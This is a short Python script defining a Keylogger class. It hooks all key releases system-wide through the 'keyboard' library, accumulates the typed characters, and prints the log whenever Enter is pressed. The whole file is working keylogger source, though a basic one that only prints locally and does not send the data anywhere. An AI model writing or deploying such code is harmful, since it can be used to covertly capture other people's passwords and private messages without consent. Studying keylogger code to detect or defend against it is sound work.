import keyboard
from threading import Semaphore, Timer

class Keylogger:
	def __init__(self):
		self.log = ""
		self.semaphore = Semaphore(0)
	
	def callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == "space": name = " "
			elif name == "enter":
				self.log += "\n"
				self.writelog()
				name = ""
			elif name == "decimal": name = "."
		self.log += name
	
	def writelog(self):
		print(self.log)
	
	def start(self):
		keyboard.on_release(callback=self.callback)
		self.semaphore.acquire()

if __name__ == "__main__":
	keylogger = Keylogger()
	keylogger.start()
		
